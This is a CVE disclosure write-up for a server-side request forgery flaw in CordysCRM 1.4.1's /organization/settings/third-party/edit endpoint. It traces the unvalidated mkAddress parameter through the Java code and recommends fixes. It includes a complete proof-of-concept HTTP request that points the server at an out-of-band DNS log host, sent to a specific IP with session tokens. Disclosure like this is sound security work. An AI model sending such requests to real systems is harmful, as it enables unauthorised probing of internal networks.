# CVE Submission: CordysCRM SSRF Vulnerability in /organization/settings/third-party/edit

## Vulnerability Information

| Field | Value |
|-------|-------|
| **Vendor** | Hangzhou Feizhiyun Information Technology Co., Ltd. |
| **Product** | CordysCRM |
| **Version** | 1.4.1 |
| **Type** | Server-Side Request Forgery (SSRF) |
| **CVSS** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H |
| **Reference** | https://github.com/1Panel-dev/CordysCRM |

## Vulnerability Description

CordysCRM v1.4.1 contains a Server-Side Request Forgery (SSRF) vulnerability in the `/organization/settings/third-party/edit` endpoint. The vulnerability exists because the backend `IntegrationConfigService.java` fails to validate or sanitize the `mkAddress` parameter when processing MAXKB configuration requests. The parameter is directly concatenated into a URL and used to make HTTP requests without any whitelist validation, protocol restriction, or internal IP blocking.

Attackers can craft malicious `mkAddress` values to force the server to make requests to arbitrary external addresses, potentially leading to internal network reconnaissance, data leakage, or further attacks.

## Code Analysis

### Step 1: Controller Layer (Data Receiving)

**File:** `backend/crm/src/main/java/cn/cordys/crm/system/controller/OrganizationSettingsController.java`

```java
@PostMapping("/third-party/edit")
@Operation(summary = "Edit third-party settings")
@RequiresPermissions(PermissionConstants.SYSTEM_SETTING_UPDATE)
public void editThirdConfig(@Validated @RequestBody ThirdConfigBaseDTO<Object> baseDTO) {
    integrationConfigService.editThirdConfig(baseDTO, OrganizationContext.getOrganizationId(), SessionUtils.getUserId());
}
```

### Step 2: Service Layer (Call Chain)

**File:** `backend/crm/src/main/java/cn/cordys/crm/system/service/IntegrationConfigService.java`

```java
// Call getToken
String token = getToken(configDTO);
// ... inside getToken ...
case MAXKB -> {
    // Get mkAddress directly from user input
    MaxKBThirdConfigRequest mkConfig = JSON.MAPPER.convertValue(configDTO.getConfig(), MaxKBThirdConfigRequest.class);
    // Call TokenService with user-controlled mkAddress
    return tokenService.getMaxKBToken(mkConfig.getMkAddress(), mkConfig.getAppSecret()) ? "true" : null;
}
```

### Step 3: Execution Point (Sink)

**File:** `backend/crm/src/main/java/cn/cordys/crm/integration/sso/service/TokenService.java`

```java
public Boolean getMaxKBToken(String mkAddress, String apiKey) {
    String body = qrCodeClient.exchange(
            // Direct URL concatenation without filtering!
            HttpRequestUtil.urlTransfer(mkAddress.concat(MaxKBApiPaths.APPLICATION), "default"),
            "Bearer " + apiKey,
            HttpHeaders.AUTHORIZATION,
            MediaType.APPLICATION_JSON,
            MediaType.APPLICATION_JSON
    );
    MaxKBResponseEntity entity = JSON.parseObject(body, MaxKBResponseEntity.class);
    return entity != null && entity.getCode() == 200;
}
```

### Call Chain Summary

```
OrganizationSettingsController.editThirdConfig()
  → IntegrationConfigService.editThirdConfig()
    → IntegrationConfigService.getToken()
      → case MAXKB: tokenService.getMaxKBToken(mkAddress, appSecret)
        → HttpRequestUtil.urlTransfer(mkAddress.concat(...))  // User-controlled URL directly used
```

**Root Cause:** The `mkAddress` parameter is directly taken from user input without any whitelist validation, protocol filtering, or internal IP blocking. It is concatenated into a URL and passed to `qrCodeClient.exchange()` to make HTTP requests.

## Exploit Details

```http
POST /organization/settings/third-party/edit HTTP/1.1
Host: 120.24.51.177:8081
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Referer: http://120.24.51.177:8081/
CSRF-TOKEN: CYkmuI1mDfJM5hSWqe7HRA37AAw+I8J/qzbRjXiVWJO0XbmCcRvNx+WQCOzTLfM6oUzUK8fUM9rin7QLWibTujGCymxwsbAdfT+bJFoBcg==
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN
Origin: http://120.24.51.177:8081
Accept: application/json, text/plain, */*
X-AUTH-TOKEN: a02ebc8c-83c7-45e6-9a48-95c249ef8cb8
Content-Length: 172

{"sqlBotBoardEnable":false,"sqlBotChatEnable":false,"startEnable":false,"mkEnable":false,"tenderEnable":false,"type":"MAXKB","mkAddress":"http://17e3a46c.log.dnslog.pp.ua.","appSecret":"11111111"}
```

### Verification Method

1. Set up a DNS log platform (e.g., dnslog.pp.ua or Interactsh)
2. Set `mkAddress` parameter to the DNS log domain
3. Send the request and check if DNS resolution is received
4. If DNS callback is received, SSRF vulnerability is confirmed

### Verification Results

After sending the POC to the target server, the DNS log platform successfully received DNS and HTTP callbacks, confirming that the server-side request was triggered and the SSRF vulnerability exists.

**Burp Suite POC Request:**

![image-20260613234530877](C:\Users\27962\AppData\Roaming\Typora\typora-user-images\image-20260613234530877.png)

*The `mkAddress` parameter is set to a DNS log domain (`http://17e3a46c.log.dnslog.pp.ua.`)*

**DNS Callback Received (Interactsh):**

![image-20260613234548536](C:\Users\27962\AppData\Roaming\Typora\typora-user-images\image-20260613234548536.png)

### Impact

Successful exploitation allows attackers to:
- **Internal Network Reconnaissance**: Probe internal services and discover exposed hosts
- **Internal Service Attack**: Target other internal services that may have weaker authentication

## Remediation

1. **Implement Whitelist Validation**: Only allow requests to trusted domains
2. **Block Internal IP Ranges**: Prevent access to 10.x.x.x, 172.16.x.x, 192.168.x.x, 169.254.x.x, and 127.x.x.x
3. **Restrict Protocols**: Only allow HTTP/HTTPS protocols
4. **Input Sanitization**: Validate and sanitize all user-controlled URL parameters

## References

- https://github.com/1Panel-dev/CordysCRM
